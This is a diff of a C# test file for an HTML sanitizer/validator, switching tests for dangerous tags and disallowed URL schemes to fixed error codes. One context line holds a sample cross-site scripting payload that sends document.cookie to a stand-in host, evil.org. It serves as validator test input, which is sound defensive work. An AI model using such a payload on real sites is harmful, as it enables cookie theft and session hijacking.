@@ -21,7 +21,7 @@ namespace Qorpent.Serialization.Tests.PortableHtml
 				Assert.AreEqual(error, result.SchemaError, "Статус ошибки валидации неверен");
 			}
 			else{
-				Assert.True(result.SchemaError.HasFlag(error));
+				Assert.True(0!=(error&result.SchemaError));
 			}
 			if (null == exceptionType) return;
 			Assert.NotNull(result.Exception,"Ожидалось исключение");
@@ -154,10 +154,9 @@ namespace Qorpent.Serialization.Tests.PortableHtml
 		[Test(Description = "Выполнение требования 'deprecated_tags'")]
 		public void DangerousTagsTestNotAllowed(string tagName){
 			var html = "<div><" + tagName + "/></div>";
-			var error = (tagName + "Detected").To<PortableHtmlSchemaErorr>();
-			testSchema(html, false, error);
+			testSchema(html, false, PortableHtmlSchemaErorr.DangerousElement);
 			html = "<div><" + tagName.ToUpper() + "/></div>";
-			testSchema(html, false, error);
+			testSchema(html, false, PortableHtmlSchemaErorr.DangerousElement);
 		}
 
 		[TestCase("http://trusted.org/account.asp?ak=<script>document.location .replace('http://evil.org/steal.cgi?'+document.cookie);</script>",PortableHtmlSchemaErorr.NonXml)]
@@ -256,7 +255,7 @@ namespace Qorpent.Serialization.Tests.PortableHtml
 		[TestCase("file", false, false, Description = "Для A не разрешены file:")]
 		[Test(Description = "Проверка особых схем для URL")]
 		public void PreventsInvalidSchemasOnUrls(string schema,  bool result ,bool isImg){
-			var error = result?PortableHtmlSchemaErorr.None: (schema + "Link").To<PortableHtmlSchemaErorr>();
+			var error = result ? PortableHtmlSchemaErorr.None : PortableHtmlSchemaErorr.DangerousLink;
 			var tag = isImg ? "img" : "a";
 			var attr = isImg ? "src" : "href";
 			var body = isImg ? "" : "x";
